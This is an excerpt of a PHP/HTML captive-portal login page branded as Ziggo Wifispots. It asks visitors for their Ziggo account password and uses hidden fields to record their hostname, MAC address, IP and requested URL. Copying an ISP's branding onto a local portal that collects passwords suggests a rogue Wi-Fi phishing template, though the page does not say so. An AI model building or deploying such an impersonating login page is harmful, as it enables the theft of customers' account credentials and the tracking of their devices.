  ...
  <body>
    ...
    <div class="container">
      <div class="account-wall">
        ...
        <h1 class="text-center login-title">Ziggo Wifispots</h1>
        <h2 class="text-center friends-text">Internet op zo'n 2 miljoen plekken zónder extra kosten</h2>
          ...
          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
            ...
            <input type="password" name="password" class="form-control" placeholder="Wachtwoord" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Inloggen &amp; Verbinden</button>
            <div class="text-center terms-text1">Gebruik uw Ziggo account om in te loggen</div>
